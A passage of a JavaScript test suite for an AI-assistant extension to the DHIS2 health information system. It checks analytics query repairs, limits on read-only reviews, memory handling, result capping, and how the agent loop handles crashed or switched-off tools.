      vm.runInContext(`lastUserText = ${JSON.stringify('Review this program. List what you find and propose fixes, but do not change anything yet.')};`, ctx);
      d.consecutiveDiscoveryCalls = 40;
      const ro40 = ctx.discoveryStreakStopOrNull('search_metadata', { object_type: 'optionSets' });
      d.consecutiveDiscoveryCalls = 60;
      const ro60 = ctx.discoveryStreakStopOrNull('search_metadata', { object_type: 'optionSets' });
      truthy('…a read-only review ("do not change anything yet") is not held to the 12-read stop, but stops at 60 and is told to answer (not to write)', ro40 === null && ro60 && /enough to answer/.test(ro60._error) && /Write your answer now/.test(ro60._hint));
      vm.runInContext(`lastUserText = ${JSON.stringify(savedText)};`, ctx); d.writeAuth = savedWa; d.consecutiveDiscoveryCalls = savedStreak;
    }

    // 4c'''. A filter on a property the type does not have, and /me.
    {
      const savedGsf = ctx.getSchemaFor;
      ctx.getSchemaFor = async (t) => (t === 'dataElements' ? { name: 'dataElement', plural: 'dataElements', properties: [{ name: 'id' }, { name: 'displayName' }, { name: 'valueType' }, { name: 'domainType' }, { name: 'dataSetElement', collectionName: 'dataSetElements' }, { name: 'optionSet' }] } : null);
      const badF = await ctx.precheckFilterAgainstSchema('dataElements?filter=program.id:eq:IpHINAT79UW&fields=id');
      const goodF = await ctx.precheckFilterAgainstSchema('dataElements?filter=dataSetElements.dataSet.id:eq:BfMAe6Itzgt&filter=identifiable:token:mal&filter=valueType:eq:NUMBER');
      const otherT = await ctx.precheckFilterAgainstSchema('organisationUnits?filter=anything:eq:1');
      ctx.getSchemaFor = savedGsf;
      truthy('a list filtered on a property the type does not have is refused before its 400 (with the way a data element reaches a program); real properties, nested paths, identifiable and unknown schemas pass',
        badF?._scope === 'known_endpoint_guidance' && /no property "program"/.test(badF._error) && /get_program_info/.test(badF._hint) && goodF === null && otherT === null);
      eq('users/me and currentUser go to /me', [(await ctx.healCollectionPath('users/me?fields=id')).path, (await ctx.healCollectionPath('currentUser')).path], ['me?fields=id', 'me']);
    }

    truthy('unplace with target "all" removes the plugin from every target (it matched none and reported "not placed anywhere")',
      /String\(args\.target\)\.toLowerCase\(\) === 'all'/.test(vm.runInContext('unplaceCustomAppPlugin.toString()', ctx)));

    {
      const savedIcons = d.knownIcons;
      d.knownIcons = vm.runInContext("new Set(['clinical_f_positive'])", ctx);
      ctx.seedKnownIcons();
      const kept = d.knownIcons.has('clinical_f_positive');
      d.knownIcons = {}; // a session-restored Set arrives as a plain object
      ctx.seedKnownIcons();
      truthy('an icon key proven earlier in the conversation stays proven on the next turn; a restored non-Set starts empty', kept && d.knownIcons.constructor.name === 'Set' && d.knownIcons.size === 0);
      d.knownIcons = savedIcons;
    }

    {
      const urls = [];
      const savedSdf2 = ctx.safeDhis2Fetch;
      ctx.safeDhis2Fetch = async (p3) => { urls.push(p3); if (/^organisationUnits\/ImspTQPwCqd/.test(p3)) return { id: 'ImspTQPwCqd', level: 1 }; if (/^programIndicators\?filter=id:in:/.test(p3)) return { programIndicators: [{ id: 'rXoaHGAXWy9' }] }; return { headers: [], rows: [] }; };
      const pc = d.pageContext; d.pageContext = { appType: 'Capture', programId: 'IpHINAT79UW' }; const savedOuCtx = d.ouContext; d.ouContext = null;
      const g1 = await ctx.executeTool('get_event_analytics', { aggregate_type: 'aggregate', breakdown_dimension: 'pi:rXoaHGAXWy9', period: 'LAST_5_YEARS' });
      const u1 = urls[urls.length - 1];
      const g2 = await ctx.executeTool('get_event_analytics', { aggregate_type: 'aggregate', ou_override: 'ImspTQPwCqd;CHILDREN', period: 'THIS_YEAR' });
      const u2 = urls[urls.length - 1];
      d.pageContext = pc; d.ouContext = savedOuCtx; ctx.safeDhis2Fetch = savedSdf2;
      truthy('get_event_analytics: no org unit → USER_ORGUNIT; a pi:-prefixed program indicator goes to /analytics as dx; a period sends no default dates; ;CHILDREN / DESCENDANTS → the next level under the unit',
        !g1._error && /^analytics\?dimension=dx%3ArXoaHGAXWy9&dimension=ou:USER_ORGUNIT&dimension=pe:LAST_5_YEARS$/.test(u1) && /USER_ORGUNIT/.test(g1._query_corrected || '')
        && !g2._error && /dimension=ou:ImspTQPwCqd;LEVEL-2&dimension=pe:THIS_YEAR$/.test(u2) && !/startDate/.test(u2));
    }

    eq('"dx:A;dx:B;dx:C" (the prefix repeated inside one list) becomes "dx:A;B;C"; a normal list is untouched',
      [ctx.healRepeatedDimensionPrefix('analytics/events/aggregate/bMcwwoVnbSR?dimension=dx:JBg6UCsP4Zq;dx:QDs1bjQhClp&dimension=ou:ImspTQPwCqd').path, ctx.healRepeatedDimensionPrefix('analytics?dimension=dx:JBg6UCsP4Zq;QDs1bjQhClp').healed],
      ['analytics/events/aggregate/bMcwwoVnbSR?dimension=dx:JBg6UCsP4Zq;QDs1bjQhClp&dimension=ou:ImspTQPwCqd', false]);
    {
      const dq = await ctx.executeTool('dhis2_query', { path: 'systemDate' });
      truthy('a guessed date endpoint is answered with today\'s date and no call; the system prompt carries the date', /^\d{4}-\d{2}-\d{2}$/.test(dq.today || '') && !dq._error && /Today's date: \$\{todayIsoDate\(\)\}/.test(vm.runInContext('_runAgenticLoopInner.toString()', ctx)));
    }

    {
      const savedSdf3 = ctx.safeDhis2Fetch; const sent3 = [];
      ctx.safeDhis2Fetch = async (p4) => {
        sent3.push(p4);
        if (/^system\/info/.test(p4)) return { lastAnalyticsTableSuccess: '2026-11-17T01:28:20.059' };
        if (/^programIndicators\?filter=id:in:/.test(p4)) return { programIndicators: [{ id: 'piNewField01', expression: 'd2:condition("#{ZkbAXlQUYJG.boFqnNiTgdd} == \'CURED\'", 100, 0)' }, { id: 'piOldField01', expression: '#{ZkbAXlQUYJG.oldDataEl001}' }] };
        if (/^dataElements\?filter=id:in:/.test(p4)) return { dataElements: [{ id: 'boFqnNiTgdd', created: '2026-11-17T12:50:01.000' }, { id: 'oldDataEl001', created: '2024-01-01T00:00:00.000' }] };
        return { rows: [['piOldField01', '2026', '5']] };
      };
      const rc3 = await vm.runInContext('piRuntimeAnalyticsCheck', ctx)(null, ['piNewField01', 'piOldField01']);
      ctx.safeDhis2Fetch = savedSdf3;
      truthy('an indicator reading a field created after the last analytics run is reported as needs_full_analytics_run without its sure-409 query; the others are queried as before',
        rc3.checked === 2 && (rc3.needs_full_analytics_run || []).some(b => b.id === 'piNewField01' && b.data_element === 'boFqnNiTgdd') && !sent3.some(p4 => /^analytics\?.*piNewField01/.test(p4)) && sent3.some(p4 => /^analytics\?dimension=dx:piOldField01/.test(p4)) && rc3.with_data.includes('piOldField01'));
    }

    {
      const sd = ctx.analyticsStatusDimensionRefusal('analytics/events/aggregate/IpHINAT79UW?dimension=ou:USER_ORGUNIT&dimension=enrollment_status');
      const dxF = ctx.healEventAnalyticsDxDimension('analytics/events/aggregate/IpHINAT79UW?dimension=bx6fsa0t90x&filter=dx:UXz7xuGCEhU:lt:2700&stage=A03MvHHogjR');
      eq('an empty-value test ":null" / ":notnull" in an event filter becomes EQ:NV / NE:NV', [ctx.healEventAnalyticsDxDimension('analytics/events/aggregate/IpHINAT79UW?filter=dx:UXz7xuGCEhU:null&stage=A03MvHHogjR').path, ctx.healEventAnalyticsDxDimension('analytics/events/aggregate/IpHINAT79UW?filter=A03MvHHogjR.UXz7xuGCEhU:notnull').path],
        ['analytics/events/aggregate/IpHINAT79UW?filter=UXz7xuGCEhU:EQ:NV&stage=A03MvHHogjR', 'analytics/events/aggregate/IpHINAT79UW?filter=A03MvHHogjR.UXz7xuGCEhU:NE:NV']);
      const savedSdf4 = ctx.safeDhis2Fetch;
      ctx.safeDhis2Fetch = async () => ({ programStages: [{ id: 'A03MvHHogjR', displayName: 'Birth', programStageDataElements: [{ dataElement: { id: 'UXz7xuGCEhU' } }, { dataElement: { id: 'sharedDe001' } }] }, { id: 'ZzYYXq4fJie', displayName: 'Postnatal', programStageDataElements: [{ dataElement: { id: 'GQY2lXrypjO' } }, { dataElement: { id: 'sharedDe001' } }] }] });
      const one = await ctx.healBareDataElementItems('analytics/enrollments/aggregate/IpHINAT79UW?dimension=UXz7xuGCEhU&filter=GQY2lXrypjO:GT:5&dimension=ou:USER_ORGUNIT');
      const two = await ctx.healBareDataElementItems('analytics/enrollments/aggregate/IpHINAT79UW?dimension=sharedDe001');
      const withStage = await ctx.healBareDataElementItems('analytics/events/aggregate/IpHINAT79UW?dimension=UXz7xuGCEhU&stage=A03MvHHogjR');
      ctx.safeDhis2Fetch = savedSdf4;
      truthy('event/enrollment analytics: a status as a dimension is refused; dx: inside a filter is dropped; a bare data element gets its stage (refused when in several; left alone next to stage=)',
        sd?._scope === 'known_endpoint_guidance' && /filter=UXz7xuGCEhU:lt:2700/.test(dxF.path)
        && one.path === 'analytics/enrollments/aggregate/IpHINAT79UW?dimension=A03MvHHogjR.UXz7xuGCEhU&filter=ZzYYXq4fJie.GQY2lXrypjO:GT:5&dimension=ou:USER_ORGUNIT'
        && /several stages/.test(two.refusal?._error || '') && withStage.healed === false);
      truthy('the indicator audit runs every valid indicator through analytics and says which cannot be calculated', /cannot_be_calculated/.test(vm.runInContext('executeManageProgramIndicators.toString()', ctx)));
    }

    truthy('create_dashboard on an existing name tells the model to ask before changing someone else\'s dashboard (not to "fix" it unasked)',
      /do not change it or its charts, maps and line lists unasked/.test(vm.runInContext('executeManageDashboards.toString()', ctx)));

    {
      const savedIdx2 = ctx.getSchemaIndex; const savedSdf5 = ctx.safeDhis2Fetch; const savedWa5 = d.writeAuth; const seen5 = [];
      const idx2 = new Map(); const os = { name: 'optionSet', plural: 'optionSets' }; idx2.set('optionset', os); idx2.set('optionsets', os);
      ctx.getSchemaIndex = async () => idx2;
      ctx.safeDhis2Fetch = async (p5) => { seen5.push(p5); return { object: { publicAccess: 'rw------' } }; };
      d.writeAuth = { scope: 'read_only', reason: 'verify' };
      await ctx.executeTool('dhis2_query', { path: 'sharing?type=optionSets&uid=x31y45jvIQL' });
      ctx.getSchemaIndex = savedIdx2; ctx.safeDhis2Fetch = savedSdf5; d.writeAuth = savedWa5;
      truthy('GET sharing with uid= and a plural type is sent as type=<singular>&id= (uid= is a 400, a plural type a 409)', seen5.some(p5 => /^sharing\?type=optionSet&id=x31y45jvIQL/.test(p5)));
      ctx.getSchemaIndex = async () => idx2; ctx.safeDhis2Fetch = async (p5) => { seen5.push(p5); return { optionSets: [] }; }; d.writeAuth = { scope: 'read_only', reason: 'verify' };
      const noId = await ctx.executeTool('dhis2_query', { path: 'sharing', query_params: { type: 'optionSets', fields: 'id' } });
      seen5.length = 0;
      await ctx.executeTool('dhis2_query', { path: 'sharing', query_params: { 'type=optionSet&id=x31y45jvIQL': '' } });
      const keyQs = seen5.some(p5 => /^sharing\?type=optionSet&id=x31y45jvIQL$/.test(p5));
      seen5.length = 0;
      await ctx.executeTool('dhis2_query', { path: 'optionSets', query_params: { fields: 'id,sharing', filters: ['id:in:[f38bstJioPs,kzgQRhOCadd]'] } });
      ctx.getSchemaIndex = savedIdx2; ctx.safeDhis2Fetch = savedSdf5; d.writeAuth = savedWa5;
      truthy('…sharing without an id is refused with the collection read that gives many objects\' sharing; a "filters" query parameter is sent as filter=',
        noId._scope === 'known_endpoint_guidance' && /optionSets\?fields=id,displayName,sharing/.test(noId._hint) && keyQs && seen5.some(p5 => /^optionSets\?fields=id%2Csharing&filter=id%3Ain%3A/.test(p5)));
    }

    // 4d. A "by district" object at the chiefdom level is refused before saving
    //     when the user's own words settle it.
    {
      const savedLevels = d.orgLevelNames; const savedText = vm.runInContext('lastUserText', ctx);
      d.orgLevelNames = [{ level: 1, name: 'National' }, { level: 2, name: 'District' }, { level: 3, name: 'Chiefdom' }, { level: 4, name: 'Facility' }];
      const said = (t) => vm.runInContext(`lastUserText = ${JSON.stringify(t)};`, ctx);
      said('Include a district table and a district map of the positivity rate');
      const map3 = await ctx.orgLevelMismatchRefusal('Positivity rate by district', ['ImspTQPwCqd'], 3, 'Map');
      const map2 = await ctx.orgLevelMismatchRefusal('Positivity rate by district', ['ImspTQPwCqd'], 2, 'Map');
      const table3 = await ctx.orgLevelMismatchRefusal('District summary', ['ImspTQPwCqd', 'LEVEL-3'], null, 'Visualization');
      said('a map of districts and chiefdoms');
      const both = await ctx.orgLevelMismatchRefusal('Positivity rate by district', ['ImspTQPwCqd'], 3, 'Map');
      said('a positivity map');
      const unsaid = await ctx.orgLevelMismatchRefusal('Positivity rate by district', ['ImspTQPwCqd'], 3, 'Map');
      truthy('a "by district" map or table at level 3 (Chiefdom) is refused before saving when the user asked for districts; level 2, a request naming chiefdoms too, or one naming neither is not refused',
        map3?._scope === 'org_level_mismatch' && /org_unit_level: 2/.test(map3._hint) && map2 === null && table3?._scope === 'org_level_mismatch' && /LEVEL-2/.test(table3._hint) && both === null && unsaid === null
        && /rebuild it at level 2/.test(await ctx.orgLevelNameWarning('Positivity rate by district', ['ImspTQPwCqd'], 3)));
      d.orgLevelNames = savedLevels; said(savedText);
    }

    // 5. The dashboard filter bar.
    ctx.safeDhis2Fetch = async (p) => (/^dimensions\/KfdsGBcoiCa/.test(p) ? { id: 'KfdsGBcoiCa', displayName: 'Births attended by' } : { _error: 'DHIS2 API 404', _status: 404 });
    const fs1 = await ctx.dashboardFilterSettings(['period', 'Location', 'KfdsGBcoiCa']);
    const fs2 = await ctx.dashboardFilterSettings(['pe', 'facility type']);
    const fs3 = await ctx.dashboardFilterSettings(['abcdefghijk']);
    truthy('allowed_filters: period / location / a dimension uid → restrictFilters + allowedFilters; an unknown word or uid is refused; none → no restriction',
      JSON.stringify(fs1) === JSON.stringify({ restrictFilters: true, allowedFilters: ['pe', 'ou', 'KfdsGBcoiCa'] }) && /not a dimension/.test(fs2._error) && /not a dimension on this server/.test(fs3._error) && (await ctx.dashboardFilterSettings(undefined)) === null
      && /no setting was needed/.test(ctx.dashboardFilterBarNote(null).note) && /only Period and Organisation unit/.test(ctx.dashboardFilterBarNote({ restrictFilters: true, allowedFilters: ['pe', 'ou'] }).note));
    truthy('…the manual says every dashboard already has period and location filters', /needs NO setting/.test(vm.runInContext('KB_DASHBOARDS_DETAILS', ctx)));

    // 6. Learning memory keeps only fixes that worked.
    const st = ctx.__memoryState();
    st.enabled = true;
    const before = st.entries.length;
    ctx.memoryBeginTurn('create a dashboard', { appType: 'Maintenance' }, new Set(['manage_dashboards', 'manage_memory']));
    ctx.memoryObserveCall('manage_dashboards', { action: 'create_dashboard' }, { _error: 'DHIS2 API 409: E4000 Missing required property `name`', _status: 409 });
    const lesson = { action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'manage_dashboards needs flat arrays', problem: 'create_dashboard failed with a 409.', solution: 'Send data_items as a flat list of ids.' };
    const guess = await ctx.executeManageMemory(lesson);
    ctx.memoryObserveCall('manage_dashboards', { action: 'create_dashboard' }, { success: true, dashboard_id: 'dashAAAAAAA' });
    const proven = await ctx.executeManageMemory(lesson);
    truthy('a lesson about a tool that failed and has not worked since is refused; once the corrected call worked it is stored',
      guess._scope === 'memory_unproven_lesson' && proven.success === true && st.entries.length === before + 1);
    st.entries = st.entries.slice(0, before);
    truthy('…a tool crash and a call in the wrong shape are never lessons', ['tool_internal_error', 'argument_shape'].every(sc => vm.runInContext('MEMORY_IGNORED_SCOPES', ctx).has(sc)));

    // 7. The loop: shapes repaired before the tool runs, a crash explained,
    //    a switched-off tool never advertised, and the tools close when the
    //    model keeps probing.
    const enc = new TextEncoder();
    const sse = (o) => `data: ${JSON.stringify({ choices: [{ index: 0, ...o }] })}\n\n`;
    const turn = async (script, userText, exec) => {
      vm.runInContext('conversationHistory = []; if (typeof _dataCheckCache !== "undefined") _dataCheckCache.clear();', ctx);
      const events = []; const seen = []; let k = 0;
      ctx.broadcast = (x) => events.push(x);
      ctx.safeDhis2Fetch = async () => ({});
      ctx.executeTool = async (name, args) => { seen.push({ name, args: JSON.parse(JSON.stringify(args)) }); return exec(name, args, seen.length); };
      ctx.fetch = async (url, opts = {}) => {
        if (!String(url).startsWith('https://llm.invalid')) return new Response('{"version":"2.42"}', { status: 200, headers: { 'Content-Type': 'application/json' } });
        // A request without tools can only be answered in text, as a real provider does.
        let toolsOffered = true;
        try { toolsOffered = Array.isArray(JSON.parse(opts.body).tools); } catch { /* keep */ }
        const step = toolsOffered ? script[Math.min(k++, script.length - 1)] : script[script.length - 1];
        const payload = step.call
          ? sse({ delta: { tool_calls: [{ index: 0, id: `c${k}`, type: 'function', function: { name: step.call, arguments: JSON.stringify(step.args) } }] }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'tool_calls' })
          : sse({ delta: { content: step.text }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'stop' });
        return new Response(new ReadableStream({ start(cc) { cc.enqueue(enc.encode(`${payload}data: [DONE]\n\n`)); cc.close(); } }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
      };
      const res = await ctx.runAgenticLoop(userText, null, false);
      const msgs = vm.runInContext('conversationHistory', ctx);
      return { res, events, seen, k, toolMsgs: JSON.parse(JSON.stringify(msgs)).filter(x => x.role === 'tool').map(x => { try { return JSON.parse(x.content); } catch { return {}; } }) };
    };
    vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
    d.pageContext = { appType: 'Dashboard' };
    const MANUAL = { call: 'manage_dashboards', args: { action: 'create_dashboard' } };
    const shaped = await turn([MANUAL, { call: 'manage_dashboards', args: crash }, { text: 'Done.' }], 'Create a dashboard called Malaria Testing and Treatment Review',
      () => ({ success: true, dashboard_id: 'dashAAAAAAA' }));
    const got = shaped.seen.find(x => x.args.action === 'create_dashboard' && x.args.items)?.args;
    eq('the loop hands the tool repaired arguments (lists, true)', got && [got.items[0].new_visualization.data_items, got.items[2].new_visualization.overall_row], [['JBg6UCsP4Zq'], true]);
    const CRASH = { call: 'manage_dashboards', args: { action: 'create_dashboard', dashboard: { name: 'X' }, items: [{ type: 'TEXT', text: 'a' }] } };
    const crashed = await turn([MANUAL, CRASH, { text: 'It failed.' }], 'Create a dashboard called X', () => { throw new TypeError('object is not iterable (cannot read property Symbol(Symbol.iterator))'); });
    const ie = crashed.toolMsgs.find(x => x._scope === 'tool_internal_error');
    truthy('a tool that throws is reported as an internal error of the extension, not of DHIS2 or the model, and shown as failed',
      ie && /Internal error in manage_dashboards \(action "create_dashboard"\)/.test(ie._error) && /not an answer from DHIS2/.test(ie._error) && /do not rebuild this step by hand through dhis2_query/.test(ie._hint)
      && crashed.events.some(x => x.type === 'AI_TOOL_DONE' && x.outcome === 'failed' && /Internal error/.test(x.summary || '')));
    const RAW = { call: 'dhis2_query', args: { path: 'metadata', method: 'POST', body: { visualizations: [{ name: 'x' }] } } };
    const probe = await turn([MANUAL, CRASH, CRASH, CRASH, CRASH, RAW, RAW, CRASH, CRASH, CRASH, CRASH, CRASH, CRASH, { text: 'Summary: nothing was created.' }], 'Create a dashboard called X',
      (name, args) => { if (name === 'dhis2_query') return saved.exec(name, args); throw new TypeError('object is not iterable'); });
    const rawResult = probe.toolMsgs.find(x => /^Blocked: POST visualizations/.test(x._error || '') && /switched off for the rest of this turn/.test(x._hint || ''));
    truthy('once manage_dashboards is switched off, a refusal no longer says "that tool is available now"', rawResult && !rawResult._redirect && !/available now/.test(rawResult._hint));
    truthy('…and after four more refused calls the tools close and the model writes its answer (no 50-step probing)', probe.k <= 11 && /nothing was created/.test(probe.res?.text || ''));
    // A huge tool result reaches the model capped (Inpatient Outcomes thread: 1.6 MB answers overflowed a 1M context).
    const bigRows = Array.from({ length: 20000 }, (_, i) => ['C' + i, 'ImspTQPwCqd', String(i)]);
    const sentToModel = [];
    const fetchBefore = ctx.fetch;
    const recordBodies = (inner) => async (url, opts = {}) => { if (String(url).startsWith('https://llm.invalid')) { try { sentToModel.push(JSON.parse(opts.body)); } catch { /* */ } } return inner(url, opts); };
    const turnRec = async (script, text, exec) => {
      const origTurnFetchSetter = Object.getOwnPropertyDescriptor(ctx, 'fetch');
      let wrapped = null;
      Object.defineProperty(ctx, 'fetch', { configurable: true, get: () => wrapped, set: (f) => { wrapped = recordBodies(f); } });
      try { return await turn(script, text, exec); } finally { Object.defineProperty(ctx, 'fetch', { configurable: true, writable: true, enumerable: true, value: fetchBefore }); void origTurnFetchSetter; }
    };
    await turnRec([{ call: 'search_metadata', args: { object_type: 'programs', name_filter: 'inpatient' } }, { text: 'Done.' }], 'Which inpatient programs exist?',
      () => ({ rows: bigRows, metaData: { items: Object.fromEntries(bigRows.map(r => [r[0], { name: r[0] + ' some long diagnosis name' }])) } }));
    const toolContents = sentToModel.flatMap(b => (b.messages || []).filter(m => m.role === 'tool').map(m => String(m.content)));
    truthy(`the loop hands the model a capped tool result (largest ${Math.max(0, ...toolContents.map(c => c.length))} chars, raw ≈ 1.6 MB)`, toolContents.length >= 1 && toolContents.every(c => c.length <= 100000) && toolContents.some(c => /_truncated_for_model/.test(c)));
  } finally {
    ctx.safeDhis2Fetch = saved.sdf; ctx.executeTool = saved.exec; ctx.fetch = saved.fetch; ctx.broadcast = saved.broadcast;
    Object.assign(d, { writeAuth: saved.wa, baseUrl: saved.base, connected: saved.connected, apiVersion: saved.apiVersion, pageContext: saved.pageContext });
    vm.runInContext(`conversationHistory = ${JSON.stringify(saved.hist)};`, ctx);
  }
}

// Inpatient admissions app thread (2026-11-26, play 2.43.2.1): a month of
// admissions written as two filters on Admission Date (GE + LE) is a 409 E7243
// "Duplicate stage dimension identifier"; twelve such queries sent in one message
// gave three 409s and nine blocks, the blocks were counted as nine retries,
// dhis2_query was switched off and the organisationUnits read in the same message
// was refused. Nothing was profiled and no app was built.
async function runInpatientAdmissionsChecks() {
  console.log('\nInpatient admissions thread: one item once per analytics query, parallel calls are one attempt:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const m = ctx.mergeRepeatedAnalyticsItems;
  const P = 'analytics/events/aggregate/eBAyeGv0exc?stage=Zj7UnCAulEk&dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT';
  const twoFilters = m(`${P}&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01&filter=Zj7UnCAulEk.eMyVanycQSC:LE:2026-05-31`);
  truthy('two filters on one item become one chained filter (the form DHIS2 takes; 409 E7243 as sent)',
    twoFilters === `${P}&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01:LE:2026-05-31`);
  truthy('…a dimension next to a filter on the same item keeps the column and takes the condition; an encoded part is read too',
    m('analytics/events/query/eBAyeGv0exc?dimension=ou:X&dimension=Zj7UnCAulEk.eMyVanycQSC&filter=Zj7UnCAulEk.eMyVanycQSC%3AGE%3A2026-05-01')
      === 'analytics/events/query/eBAyeGv0exc?dimension=ou:X&dimension=Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01');
  truthy('…a bare data element joins its stage-qualified form; an enrollment attribute range joins too',
    m('analytics/events/query/p?filter=eMyVanycQSC:GE:2026-01-01&dimension=Zj7UnCAulEk.eMyVanycQSC:LE:2026-03-31')
      === 'analytics/events/query/p?dimension=Zj7UnCAulEk.eMyVanycQSC:GE:2026-01-01:LE:2026-03-31'
    && m('analytics/enrollments/aggregate/p?filter=A03MvHHogjR.UXz7xuGCEhU:GE:1000&filter=A03MvHHogjR.UXz7xuGCEhU:LE:3000')
      === 'analytics/enrollments/aggregate/p?filter=A03MvHHogjR.UXz7xuGCEhU:GE:1000:LE:3000');
  const untouched = [
    `${P}&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01&filter=Zj7UnCAulEk.fWIAEtYVEGk:LE:2026-05-31`,
    'analytics/events/query/p?dimension=J5jldMd8OHv:uIuxlbV1vRT;EYbopBOJWsW&dimension=J5jldMd8OHv:tDZVQ1WtwpA',
    'analytics/events/query/p?filter=Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01&filter=edqlbukwRfQ.eMyVanycQSC:LE:2026-05-31',
    'analytics?dimension=dx:a&filter=x:GE:1&filter=x:LE:2',
  ];
  truthy('…a "+" (space) in a value stays a space, and a bare element with a legend set is not folded into the plain item',
    m('analytics/events/query/p?filter=Zj7UnCAulEk.K6uUAvq500H:LIKE:foo+bar&dimension=Zj7UnCAulEk.K6uUAvq500H').includes('LIKE:foo%20bar')
    && m('analytics/events/query/p?dimension=eMyVanycQSC-Lgs1234567a&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2020-01-01') === 'analytics/events/query/p?dimension=eMyVanycQSC-Lgs1234567a&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2020-01-01');
  truthy('…two different items, a repeated group-set dimension, the same element on two stages and other endpoints are left alone',
    untouched.every((u) => m(u) === u));
  const guard = ctx.buildCustomAppGuardJs({ needsWriteAccess: false });
  truthy('generated apps join the same conditions in their request guard (fetch and XMLHttpRequest)',
    /function mergeRepeatedAnalyticsItems/.test(guard) && /withEventAggregateCacheKey\(mergeRepeatedAnalyticsItems\(/.test(guard) && /fixedUrl = mergeRepeatedAnalyticsItems\(/.test(guard));
  truthy('every internal GET goes through it as well', /mergeRepeatedAnalyticsItems\(normalizeTrackerQuery\(cleanPath/.test(vm.runInContext('safeDhis2Fetch.toString()', ctx)) || /mergeRepeatedAnalyticsItems\(normalizeTrackerQuery\(cleanPath/.test(require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'core.js'), 'utf8')));

  const saved = { sdf: ctx.safeDhis2Fetch, exec: ctx.executeTool, fetch: ctx.fetch, broadcast: ctx.broadcast };
  const sent = [];
  ctx.safeDhis2Fetch = async (p) => {
    sent.push(p);
    if (p.startsWith('programs/eBAyeGv0exc')) return { id: 'eBAyeGv0exc', programType: 'WITHOUT_REGISTRATION', programStages: [{ id: 'Zj7UnCAulEk', programStageDataElements: [{ dataElement: { id: 'eMyVanycQSC' } }] }] };
    if (p.startsWith('programs')) return { programs: [{ id: 'eBAyeGv0exc', programStages: [{ id: 'Zj7UnCAulEk' }] }] };
    if (p.startsWith('analytics/')) return /eMyVanycQSC[^&]*&[^]*eMyVanycQSC/.test(p) ? { _error: 'DHIS2 API 409: Duplicate stage dimension identifier', _status: 409 } : { headers: [{ name: 'pe' }, { name: 'value' }], rows: [['202605', '4393']] };
    return { _error: 'x' };
  };
  try {
    const r = await ctx.executeTool('dhis2_query', { path: 'analytics/events/aggregate/eBAyeGv0exc', query_params: { stage: 'Zj7UnCAulEk', dimension: ['pe:LAST_12_MONTHS'], filter: ['ou:USER_ORGUNIT', 'Zj7UnCAulEk.eMyVanycQSC:GE:2026-05-01', 'Zj7UnCAulEk.eMyVanycQSC:LE:2026-05-31'], outputType: 'EVENT' } });
    const out = sent.filter((p) => p.startsWith('analytics/'));
    truthy('through dhis2_query: the joined query is sent, answers, and the result says how a range on one item is written',
      !r._error && out.length && out.every((p) => /eMyVanycQSC:GE:2026-05-01:LE:2026-05-31/.test(p) && (p.match(/eMyVanycQSC/g) || []).length === 1)
      && /E7243/.test(r._query_corrected || '') && /:GE:<from>:LE:<to>/.test(r._query_corrected || ''));
  } finally { ctx.safeDhis2Fetch = saved.sdf; }

  // Counting by event date when the stage records its own dates (Jul-Sep 2026 picked; admissions were 2018-2021).
  {
    const savedF = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programStages/Zj7UnCAulEk') ? { programStageDataElements: [{ dataElement: { id: 'eMyVanycQSC', displayName: 'Admission Date', valueType: 'DATE' } }, { dataElement: { id: 'msodh3rEMJa', displayName: 'Discharge Date', valueType: 'DATE' } }, { dataElement: { id: 'K6uUAvq500H', displayName: 'Diagnosis', valueType: 'TEXT' } }] }
      : p.startsWith('programs/') ? { programStages: [{ id: 'Zj7UnCAulEk' }] } : { _error: 'x' });
    try {
      const d0 = ctx.__dhis2(); d0.turnCounter = 9001;
      const byEvent = await ctx.eventDateFieldsNote('analytics/events/aggregate/eBAyeGv0exc?dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT');
      const again = await ctx.eventDateFieldsNote('analytics/events/aggregate/eBAyeGv0exc?dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT');
      d0.turnCounter = 9002;
      const byDate = await ctx.eventDateFieldsNote('analytics/events/aggregate/eBAyeGv0exc?stage=Zj7UnCAulEk&dimension=pe:LAST_12_MONTHS&filter=Zj7UnCAulEk.eMyVanycQSC:GE:2026-01-01:LE:2026-01-31');
      const afterDate = await ctx.eventDateFieldsNote('analytics/events/aggregate/eBAyeGv0exc?dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT');
      const noTime = await ctx.eventDateFieldsNote('analytics/events/aggregate/eBAyeGv0exc?stage=Zj7UnCAulEk&dimension=ou:USER_ORGUNIT');
      truthy('a count by event date on a stage with its own date fields names them and both ways to count by them, once per turn; a query already on a date field or with no time is left alone',
        /by EVENT date/.test(byEvent || '') && /Admission Date Zj7UnCAulEk\.eMyVanycQSC/.test(byEvent) && /Discharge Date/.test(byEvent) && !/Diagnosis/.test(byEvent)
        && /:GE:<from>:LE:<to>/.test(byEvent) && again === null && byDate === null && /by EVENT date/.test(afterDate || '') && noTime === null);
    } finally { ctx.safeDhis2Fetch = savedF; }
    truthy('the privacy refusal tells a remote model that a build does not need patient rows, and not to stop a build to ask for a model switch',
      /BUILDING an app, plugin, dashboard or line list never needs these rows/.test(vm.runInContext('enforcePatientDataPrivacyGate.toString()', ctx)) && /Do not stop a build/.test(vm.runInContext('enforcePatientDataPrivacyGate.toString()', ctx)));
  }

  // A range on a date field next to the event-date window (Q1 2020 admissions have 2025 event dates).
  {
    const h = ctx.healAnalyticsPeriodAndOrgUnitParams;
